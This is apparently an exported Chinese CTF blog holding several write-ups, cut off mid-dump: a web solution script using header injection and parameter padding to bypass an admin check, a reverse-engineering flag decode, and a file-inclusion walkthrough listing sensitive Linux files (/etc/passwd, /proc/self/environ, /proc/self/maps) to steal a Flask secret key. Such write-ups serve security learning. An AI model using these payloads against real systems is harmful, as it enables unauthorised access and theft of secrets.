<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">highlight_file(__FILE__) #讲当前文件代码已语法高亮的形式输出到浏览器</span><br><span class="line">$input = file_get_contents(&#x27;php://input&#x27;);  #接受xml文件json数据</span><br><span class="line">$headers = (array)json_decode($input)-&gt;headers; #提取请求头信息，讲其转换为数组提取头部信息</span><br><span class="line">$offset = stripos($headers[$i], &#x27;:&#x27;); #查找&quot;:&quot;的在数组元素中第一次出现的位置</span><br><span class="line">$key = substr($headers[$i], 0, $offset); </span><br><span class="line">$value = substr($headers[$i], $offset + 1);#截取数据</span><br><span class="line">for($i = 0; $i &lt; count($headers); $i++)&#123;</span><br><span class="line">    $offset = stripos($headers[$i], &#x27;:&#x27;); </span><br><span class="line">    $key = substr($headers[$i], 0, $offset);</span><br><span class="line">    $value = substr($headers[$i], $offset + 1);</span><br><span class="line">    if(stripos($key, &#x27;admin&#x27;) &gt; -1 &amp;&amp; stripos($value, &#x27;true&#x27;) &gt; -1)&#123;</span><br><span class="line">        die(&#x27;try hard&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>循环体里面的代码是获取请求信息头header数组中的所有键值对，并且判断键值对是否符合[“admin”:”true”]，否则就退出脚本结束程序</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$params</span> = (<span class="keyword">array</span>)json_decode(<span class="variable">$input</span>)-&gt;params;  <span class="comment">#获取请求信息中的params参数</span></span><br><span class="line"><span class="variable">$url</span> .= http_build_query(<span class="variable">$params</span>);     <span class="comment">#将参数拼接到url中作为访问参数</span></span><br><span class="line"><span class="variable">$url</span> .= <span class="string">&#x27;&amp;admin=false&#x27;</span>;   <span class="comment">#添加到url中作为参数</span></span><br><span class="line"><span class="variable">$ch</span> = curl_init();  <span class="comment">#初始新的curl会话</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#下面就是设置URL，请求头部，最长毫秒为5000</span></span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$headers</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_TIMEOUT_MS, <span class="number">5000</span>);</span><br><span class="line">curl_setopt(<span class="variable">$ch</span>, CURLOPT_NOBODY, <span class="literal">FALSE</span>);</span><br><span class="line"><span class="variable">$result</span> = curl_exec(<span class="variable">$ch</span>);  <span class="comment">#传递给浏览器</span></span><br><span class="line">curl_close(<span class="variable">$ch</span>);   <span class="comment">#关闭curl资源</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br></pre></td></tr></table></figure>



<p>所以需要将请求参数admin置为true，将后面拼接的admin&#x3D;flase丢弃掉，这里需要利用默认最大接收参数长度为1000从而使得后面加入的admin&#x3D;flase丢弃掉。</p>
<p>代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line"></span><br><span class="line">url = &quot;http://61.147.171.105:49169/&quot;</span><br><span class="line"></span><br><span class="line">datas = &#123;&quot;headers&quot;: [&quot;xx:xx\nadmin: true&quot;, &quot;Content-Type: application/json&quot;],</span><br><span class="line">         &quot;params&quot;: &#123;&quot;admin&quot;: &quot;true&quot;&#125;&#125;</span><br><span class="line"></span><br><span class="line">for i in range(1000):</span><br><span class="line">    datas[&quot;params&quot;][&quot;x&quot; + str(i)] = i</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">&#125;</span><br><span class="line">json1 = json.dumps(datas)</span><br><span class="line">print(json1)</span><br><span class="line">resp = requests.post(url, headers=headers, data=json1)</span><br><span class="line">print(resp.content)</span><br></pre></td></tr></table></figure>

<p>获取flag:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CatCTF&#123;23aaaab824aadf15eb19f4236f3e3b51&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>-CTF -Web</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Reverse系列之re1</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Bre1/</url>
    <content><![CDATA[<h1 id="【攻防世界】Reverse系列之re1"><a href="#【攻防世界】Reverse系列之re1" class="headerlink" title="【攻防世界】Reverse系列之re1"></a>【攻防世界】Reverse系列之re1</h1><img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Bre1/image-20231122204614882.png" class title="image-20231122204614882">

<p>使用IDA打开该文件，反汇编获取其源代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  __m128i v5; <span class="comment">// [esp+0h] [ebp-44h] BYREF</span></span><br><span class="line">  __int64 v6; <span class="comment">// [esp+10h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+18h] [ebp-2Ch]</span></span><br><span class="line">  __int16 v8; <span class="comment">// [esp+1Ch] [ebp-28h]</span></span><br><span class="line">  <span class="keyword">char</span> v9[<span class="number">32</span>]; <span class="comment">// [esp+20h] [ebp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5 = _mm_loadu_si128((<span class="keyword">const</span> __m128i *)&amp;xmmword_413E34);</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0x7D465443545544</span>i64;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;欢迎来到DUTCTF呦\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;这是一道很可爱很简单的逆向题呦\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;输入flag吧:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, v9);</span><br><span class="line">  v3 = <span class="built_in">strcmp</span>(v5.m128i_i8, v9);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    v3 = v3 &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">printf</span>(aFlag_0); <span class="comment">//输入错误</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(aFlagGet); <span class="comment">//输入正确</span></span><br><span class="line">  system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据上面代码进行反推，关键代码为  **v3 &#x3D; strcmp(v5.m128i_i8, v9);**所以反推回去可以判断只要输入值为v5.m128i这个变量的值，即判断成功，输出”flag get”</p>
<p>我们查看v5的值，可以看到为空值，这是为什么呢？我们看到代码中的**v5 &#x3D; _mm_loadu_si128((const __m128i *)&amp;xmmword_413E34);**这里才对v5进行赋值，我们查看xmmword_413E34的值</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Bre1/image-20231122210014338.png" class title="image-20231122210014338">

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xmmword_413E34  xmmword 3074656D30633165577B465443545544h</span><br><span class="line">qword_413E44    dq 7D465443545544h</span><br></pre></td></tr></table></figure>

<p>将16进制转换为字符，对其进行解码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DUTCTF&#123;We1c0met0DUTCTF&#125;</span><br></pre></td></tr></table></figure>

<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Reverse%E7%B3%BB%E5%88%97%E4%B9%8Bre1/image-20231122211739668.png" class title="image-20231122211739668">]]></content>
      <categories>
        <category>CTF</category>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>-CTF -Reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>【攻防世界】Web系列之catcat-new</title>
    <url>/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/</url>
    <content><![CDATA[<h1 id="【攻防世界】Web系列之catcat-new"><a href="#【攻防世界】Web系列之catcat-new" class="headerlink" title="【攻防世界】Web系列之catcat-new"></a>【攻防世界】Web系列之catcat-new</h1><p>题目环境可以判断出来存在任意文件包含漏洞，无法遍历到flag文件</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/image-20231224205152502.png" class title="image-20231224205152502">

<p>这里简单列举几个linux常见的敏感文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/passwd</span><br><span class="line">/proc/self      #当前运行进程</span><br><span class="line">/proc/self/cmdline  #当前进程命令行参数=</span><br><span class="line">/proc/self/men     #当前进程的内存内容</span><br><span class="line">/proc/self/maps    #当前进程的内存映射关系</span><br><span class="line">/proc/self/environ #包含当前进程的环境变量</span><br><span class="line">/proc/self/fd  #包含当前进程打开的文件的内容和路径</span><br><span class="line">/proc/seflf/exe   #获取当前jin&#x27;c</span><br></pre></td></tr></table></figure>

<p>使用php:&#x2F;&#x2F;input伪协议尝试写入shell，返回失败，后端可能不是php</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/image-20231224205342660.png" class title="image-20231224205342660">



<p>查看&#x2F;proc&#x2F;self&#x2F;cmdline当前运行的进程参数行命令，发现使用python启动app.py</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/image-20231224205812081.png" class title="image-20231224205812081">

<p>app.py可以判断出使用的是Flask框架开发的网站，我们去遍历该app.py文件</p>
<img src="/2024/01/17/%E3%80%90%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91Web%E7%B3%BB%E5%88%97%E4%B9%8Bcatcat-new/image-20231224210147178.png" class title="image-20231224210147178">

<p>这里对输出的app.py文件作了简单处理，得到如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, Markup</span><br><span class="line"><span class="keyword">from</span> cat <span class="keyword">import</span> cat</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line">app = Flask(</span><br><span class="line"> __name__,</span><br><span class="line"> static_url_path=<span class="string">&#x27;/&#x27;</span>, </span><br><span class="line"> static_folder=<span class="string">&#x27;static&#x27;</span> </span><br><span class="line">)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(uuid.uuid4()).replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>) + <span class="string">&quot;*abcdefgh&quot;</span> <span class="comment">#随机生成一串字符并在后面添加字符串</span></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line"> flag = cat(<span class="string">&quot;/flag&quot;</span>)<span class="comment">#导入flag文件</span></span><br><span class="line"> os.remove(<span class="string">&quot;/flag&quot;</span>)<span class="comment">#删除flag文件</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line"> detailtxt = os.listdir(<span class="string">&#x27;./details/&#x27;</span>)</span><br><span class="line"> cats_list = []</span><br><span class="line"> <span class="keyword">for</span> i <span class="keyword">in</span> detailtxt:</span><br><span class="line"> cats_list.append(i[:i.index(<span class="string">&#x27;.&#x27;</span>)])</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, cats_list=cats_list, cat=cat)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/info&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">info</span>():</span></span><br><span class="line"> filename = <span class="string">&quot;./details/&quot;</span> + request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line"> start = request.args.get(<span class="string">&#x27;start&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> end = request.args.get(<span class="string">&#x27;end&#x27;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"> name = request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>)[:request.args.get(<span class="string">&#x27;file&#x27;</span>, <span class="string">&quot;&quot;</span>).index(<span class="string">&#x27;.&#x27;</span>)]</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">return</span> render_template(<span class="string">&quot;detail.html&quot;</span>, catname=name, info=cat(filename, start, end))</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>, methods=[<span class="string">&quot;GET&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_can_list_root</span>():</span></span><br><span class="line"> <span class="keyword">if</span> session.get(<span class="string">&#x27;admin&#x27;</span>) == <span class="number">1</span>:  <span class="comment">#当session信息中admin=1在/admin路径下才返回flag</span></span><br><span class="line"> <span class="keyword">return</span> flag</span><br><span class="line"> <span class="keyword">else</span>:</span><br><span class="line"> session[<span class="string">&#x27;admin&#x27;</span>] = <span class="number">0</span></span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;NoNoNo&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"> app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, debug=<span class="literal">False</span>, port=<span class="number">5637</span>)</span><br></pre></td></tr></table></figure>

<p>上面的代码基本可以得出解题逻辑：在&#x2F;admin路径下判断seesion中是否存在admin&#x3D;1字段，则返回flag文件，随后导入flag文件并删除。所以需要对flask_seesion进行伪造，首先需要获取secret_key，可以在&#x2F;proc&#x2F;self&#x2F;maps里面找到内存数据的映射关系从而寻找secret_key值。</p>
<p>如下为maps数据</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">56322e390000-56322e391000 r--p 00000000 fd:00 23480232 /usr/local/bin/python3.7</span><br><span class="line">56322e391000-56322e392000 r-xp 00001000 fd:00 23480232 /usr/local/bin/python3.7</span><br><span class="line">56322e392000-56322e393000 r--p 00002000 fd:00 23480232 /usr/local/bin/python3.7</span><br><span class="line">56322e393000-56322e394000 r--p 00002000 fd:00 23480232 /usr/local/bin/python3.7</span><br><span class="line">56322e394000-56322e395000 rw-p 00003000 fd:00 23480232 /usr/local/bin/python3.7</span><br><span class="line">56322eccc000-56322eccd000 ---p 00000000 00:00 0 [heap]</span><br><span class="line">56322eccd000-56322ecd1000 rw-p 00000000 00:00 0 [heap]</span><br><span class="line">7f82072af000-7f820732f000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207432000-7f8207434000 ---p 00000000 00:00 0 </span><br><span class="line">7f8207434000-7f820753d000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820754a000-7f820754e000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207554000-7f8207558000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820755c000-7f82076f0000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82076f1000-7f8207774000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207777000-7f82077bb000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82077bb000-7f82077bd000 r--p 00000000 fd:00 23480898 /usr/local/lib/python3.7/lib-dynload/_posixsubprocess.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82077bd000-7f82077bf000 r-xp 00002000 fd:00 23480898 /usr/local/lib/python3.7/lib-dynload/_posixsubprocess.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82077bf000-7f82077c0000 r--p 00004000 fd:00 23480898 /usr/local/lib/python3.7/lib-dynload/_posixsubprocess.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82077c0000-7f82077c1000 r--p 00004000 fd:00 23480898 /usr/local/lib/python3.7/lib-dynload/_posixsubprocess.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82077c1000-7f82077c2000 rw-p 00005000 fd:00 23480898 /usr/local/lib/python3.7/lib-dynload/_posixsubprocess.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82077c2000-7f82077ce000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82077d1000-7f82078c5000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82078c6000-7f8207938000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207938000-7f820793e000 r--p 00000000 fd:00 23480885 /usr/local/lib/python3.7/lib-dynload/_decimal.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820793e000-7f8207975000 r-xp 00006000 fd:00 23480885 /usr/local/lib/python3.7/lib-dynload/_decimal.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207975000-7f8207981000 r--p 0003d000 fd:00 23480885 /usr/local/lib/python3.7/lib-dynload/_decimal.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207981000-7f8207982000 r--p 00048000 fd:00 23480885 /usr/local/lib/python3.7/lib-dynload/_decimal.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207982000-7f820798a000 rw-p 00049000 fd:00 23480885 /usr/local/lib/python3.7/lib-dynload/_decimal.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820798a000-7f8207a15000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207a15000-7f8207a63000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207a63000-7f8207a66000 r--p 00000000 fd:00 23480934 /usr/local/lib/python3.7/lib-dynload/unicodedata.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207a66000-7f8207a6a000 r-xp 00003000 fd:00 23480934 /usr/local/lib/python3.7/lib-dynload/unicodedata.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207a6a000-7f8207b4b000 r--p 00007000 fd:00 23480934 /usr/local/lib/python3.7/lib-dynload/unicodedata.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207b4b000-7f8207b4c000 r--p 000e7000 fd:00 23480934 /usr/local/lib/python3.7/lib-dynload/unicodedata.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207b4c000-7f8207b69000 rw-p 000e8000 fd:00 23480934 /usr/local/lib/python3.7/lib-dynload/unicodedata.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8207b69000-7f8207b75000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207b76000-7f8207c06000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207c07000-7f8207d33000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207d33000-7f8207d4f000 r--p 00000000 fd:00 23348864 /lib/libssl.so.1.1</span><br><span class="line">7f8207d4f000-7f8207d8f000 r-xp 0001c000 fd:00 23348864 /lib/libssl.so.1.1</span><br><span class="line">7f8207d8f000-7f8207da7000 r--p 0005c000 fd:00 23348864 /lib/libssl.so.1.1</span><br><span class="line">7f8207da7000-7f8207db0000 r--p 00073000 fd:00 23348864 /lib/libssl.so.1.1</span><br><span class="line">7f8207db0000-7f8207db4000 rw-p 0007c000 fd:00 23348864 /lib/libssl.so.1.1</span><br><span class="line">7f8207db4000-7f8207f85000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8207f86000-7f8208003000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208004000-7f8208017000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208017000-7f8208019000 r--p 00000000 fd:00 23480918 /usr/local/lib/python3.7/lib-dynload/binascii.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208019000-7f820801d000 r-xp 00002000 fd:00 23480918 /usr/local/lib/python3.7/lib-dynload/binascii.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820801d000-7f820801f000 r--p 00006000 fd:00 23480918 /usr/local/lib/python3.7/lib-dynload/binascii.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820801f000-7f8208020000 r--p 00007000 fd:00 23480918 /usr/local/lib/python3.7/lib-dynload/binascii.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208020000-7f8208021000 rw-p 00008000 fd:00 23480918 /usr/local/lib/python3.7/lib-dynload/binascii.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208021000-7f8208026000 rw-p 00000000 00:00 0 </span><br><span class="line">7f8208026000-7f820802b000 r--p 00000000 fd:00 23480883 /usr/local/lib/python3.7/lib-dynload/_datetime.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820802b000-7f8208036000 r-xp 00005000 fd:00 23480883 /usr/local/lib/python3.7/lib-dynload/_datetime.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f8208036000-7f820803b000 r--p 00010000 fd:00 23480883 /usr/local/lib/python3.7/lib-dynload/_datetime.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820803b000-7f820803c000 r--p 00014000 fd:00 23480883 /usr/local/lib/python3.7/lib-dynload/_datetime.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820803c000-7f820803e000 rw-p 00015000 fd:00 23480883 /usr/local/lib/python3.7/lib-dynload/_datetime.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820803e000-7f82080ac000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82080ac000-7f82080ae000 r--p 00000000 fd:00 23480930 /usr/local/lib/python3.7/lib-dynload/select.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080ae000-7f82080b2000 r-xp 00002000 fd:00 23480930 /usr/local/lib/python3.7/lib-dynload/select.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080b2000-7f82080b3000 r--p 00006000 fd:00 23480930 /usr/local/lib/python3.7/lib-dynload/select.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080b3000-7f82080b4000 r--p 00006000 fd:00 23480930 /usr/local/lib/python3.7/lib-dynload/select.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080b4000-7f82080b6000 rw-p 00007000 fd:00 23480930 /usr/local/lib/python3.7/lib-dynload/select.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080b6000-7f82080c0000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82080c0000-7f82080c4000 r--p 00000000 fd:00 23480905 /usr/local/lib/python3.7/lib-dynload/_socket.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080c4000-7f82080cd000 r-xp 00004000 fd:00 23480905 /usr/local/lib/python3.7/lib-dynload/_socket.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080cd000-7f82080d2000 r--p 0000d000 fd:00 23480905 /usr/local/lib/python3.7/lib-dynload/_socket.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080d2000-7f82080d3000 r--p 00011000 fd:00 23480905 /usr/local/lib/python3.7/lib-dynload/_socket.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080d3000-7f82080d8000 rw-p 00012000 fd:00 23480905 /usr/local/lib/python3.7/lib-dynload/_socket.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080d8000-7f82080dd000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82080de000-7f82080e7000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82080e7000-7f82080e8000 r--p 00000000 fd:00 23480876 /usr/local/lib/python3.7/lib-dynload/_contextvars.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080e8000-7f82080e9000 r-xp 00001000 fd:00 23480876 /usr/local/lib/python3.7/lib-dynload/_contextvars.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080e9000-7f82080ea000 r--p 00002000 fd:00 23480876 /usr/local/lib/python3.7/lib-dynload/_contextvars.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080ea000-7f82080eb000 r--p 00002000 fd:00 23480876 /usr/local/lib/python3.7/lib-dynload/_contextvars.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080eb000-7f82080ec000 rw-p 00003000 fd:00 23480876 /usr/local/lib/python3.7/lib-dynload/_contextvars.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82080ec000-7f820816c000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820816d000-7f82081c5000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82081c6000-7f820835a000 rw-p 00000000 00:00 0 </span><br><span class="line">7f820835a000-7f820835b000 r--p 00000000 fd:00 23480896 /usr/local/lib/python3.7/lib-dynload/_opcode.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820835b000-7f820835c000 r-xp 00001000 fd:00 23480896 /usr/local/lib/python3.7/lib-dynload/_opcode.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820835c000-7f820835d000 r--p 00002000 fd:00 23480896 /usr/local/lib/python3.7/lib-dynload/_opcode.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820835d000-7f820835e000 r--p 00002000 fd:00 23480896 /usr/local/lib/python3.7/lib-dynload/_opcode.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820835e000-7f820835f000 rw-p 00003000 fd:00 23480896 /usr/local/lib/python3.7/lib-dynload/_opcode.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f820835f000-7f82083b6000 rw-p 00000000 00:00 0 </span><br><span class="line">7f82083b6000-7f82083b7000 r--p 00000000 fd:00 23480900 /usr/local/lib/python3.7/lib-dynload/_random.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083b7000-7f82083ba000 r-xp 00001000 fd:00 23480900 /usr/local/lib/python3.7/lib-dynload/_random.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083ba000-7f82083bb000 r--p 00004000 fd:00 23480900 /usr/local/lib/python3.7/lib-dynload/_random.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083bb000-7f82083bc000 r--p 00004000 fd:00 23480900 /usr/local/lib/python3.7/lib-dynload/_random.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083bc000-7f82083bd000 rw-p 00005000 fd:00 23480900 /usr/local/lib/python3.7/lib-dynload/_random.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083bd000-7f82083be000 r--p 00000000 fd:00 23480867 /usr/local/lib/python3.7/lib-dynload/_bisect.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083be000-7f82083bf000 r-xp 00001000 fd:00 23480867 /usr/local/lib/python3.7/lib-dynload/_bisect.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083bf000-7f82083c0000 r--p 00002000 fd:00 23480867 /usr/local/lib/python3.7/lib-dynload/_bisect.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083c0000-7f82083c1000 r--p 00002000 fd:00 23480867 /usr/local/lib/python3.7/lib-dynload/_bisect.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083c1000-7f82083c2000 rw-p 00003000 fd:00 23480867 /usr/local/lib/python3.7/lib-dynload/_bisect.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083c2000-7f82083c4000 r--p 00000000 fd:00 23480903 /usr/local/lib/python3.7/lib-dynload/_sha3.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083c4000-7f82083d8000 r-xp 00002000 fd:00 23480903 /usr/local/lib/python3.7/lib-dynload/_sha3.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083d8000-7f82083da000 r--p 00016000 fd:00 23480903 /usr/local/lib/python3.7/lib-dynload/_sha3.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083da000-7f82083db000 r--p 00017000 fd:00 23480903 /usr/local/lib/python3.7/lib-dynload/_sha3.cpython-37m-x86_64-linux-gnu.so</span><br><span class="line">7f82083db000-7f82083dd000 rw-p 